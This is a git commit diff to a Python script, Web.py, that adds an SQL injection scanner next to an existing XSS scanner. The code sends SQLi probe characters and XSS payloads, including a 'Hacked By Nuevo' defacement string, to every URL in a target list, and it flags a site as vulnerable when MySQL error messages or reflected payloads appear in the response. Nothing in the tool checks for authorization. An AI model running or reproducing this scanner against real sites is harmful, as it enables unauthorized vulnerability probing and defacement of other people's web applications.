46c46fd89c0664cd3d593b1b2dc58453c703a780
Agung Rizal <NuevoQuerto@gmail.com>
2017-06-10 21:09:09 +0700

    Update Web.py
    Adding SQLI Scanner

--- Web.py
+++ Web.py
@@ -22,11 +22,15 @@ try:
 	
 	TargetWordlists = []
 	
-	XSS_Payload = []
+	Payload = []
 	
-	Default_Payload = ["<script>alert(1)</script>", "<img src=x onerror=alert(1) />", "\"><img src=x onerror=alert(1) />", 
+	SQLI_Payload = ["'", "\"", "\\"]
+	
+	SQLI_Error = "SQL syntax|valid MySQL result|mysql_fetch_array|getimagesize|session_start|mysql_num_rows|mysql_query" #MySQL Error DB
+	
+	XSS_Payload = ["<script>alert(1)</script>", "<img src=x onerror=alert(1) />", "\"><img src=x onerror=alert(1) />", 
 		"'<1337 contenteditable onmouseover=prompt(document.domain) />", "\"><img src=x onerror=alert('XSS-By-Nuevo-Querto') />Nuevo/", "\"><img src=\"x\" onerror=\"alert(1);\" />",
-		"\"><marquee><h1>Hacked By Nuevo</h1></marquee> />"
+		"\"><marquee><h1>Hacked By Nuevo</h1></marquee> />", "\"><img src=x onerror=prompt(document.domain) />Tes"
 	] # Default XSS Payload
 	
 	if Args.Wordlist:
@@ -34,10 +38,10 @@ try:
 			Read = file.read()
 			Pisahkan = Read.split("\n")
 		for i in range(len(Pisahkan)):
-			Import_Payload = XSS_Payload.append("%s" %(Pisahkan[i]))
+			Import_Payload = Payload.append("%s" %(Pisahkan[i]))
 	else:
-		for x in range(len(Default_Payload)):
-			Import_Payload = XSS_Payload.append("%s" %(Default_Payload[x]))
+		for x in range(len(XSS_Payload)):
+			Import_Payload = Payload.append("%s" %(XSS_Payload[x]))
 		
 	if Args.Target:
 		with open(Args.Target, "r+") as file:
@@ -48,13 +52,24 @@ try:
 			Checking_Parameter = re.search(r"\?|=", TargetWordlists[i], re.M|re.I)
 			print "\n\n\n" + "[ Target %s: " %(i + 1) + TargetWordlists[i] + " ]\n"
 			if Checking_Parameter:
-				for z in range(len(XSS_Payload)):
-					InjectingPayload = TargetWordlists[i] + "%s" %(XSS_Payload[z]) # Injecting XSS Payload
+				print "[ SQLI Scanning ]\n"
+				for z in range(len(SQLI_Payload)): # Injecting SQLI Payload
+					InjectingPayload = TargetWordlists[i] + "%s" %(SQLI_Payload[z])
 					Request = requests.get(InjectingPayload)
 					HTTPCode = Request.status_code
-					Checking_Payload = re.search(re.escape(r"%s" %(XSS_Payload[z])), Request.text, re.M|re.I)
+					Checking_Payload = re.search(r"%s" %(SQLI_Error), Request.text, re.M|re.I)
+					print "Payload: " + InjectingPayload + " %s" %("[ Vuln To SQLI ] [ %s ]\n" if Checking_Payload else "[ Not Vuln To SQLI ] [ %s ]\n") %(HTTPCode)
+				print "\n[ SQLI Scanning Done ]\n\n\n"
+				
+				print "[ XSS Scanning ]\n"
+				for z in range(len(Payload)): # Injecting XSS Payload
+					InjectingPayload = TargetWordlists[i] + "%s" %(Payload[z])
+					Request = requests.get(InjectingPayload)
+					HTTPCode = Request.status_code
+					Checking_Payload = re.search(re.escape(r"%s" %(Payload[z])), Request.text, re.M|re.I)
 					
 					print "Payload: " + InjectingPayload + " %s" %("[ Vuln To XSS ] [ %s ]\n" if Checking_Payload else "[ Not Vuln To XSS ] [ %s ]\n") %(HTTPCode)
+				print "\n[ XSS Scanning Done ]\n"
 			else:
 				print TargetWordlists[i] + " -> Not Valid Target URL, Example http://target.com?id=1\n"
 			print "[ -- ]"
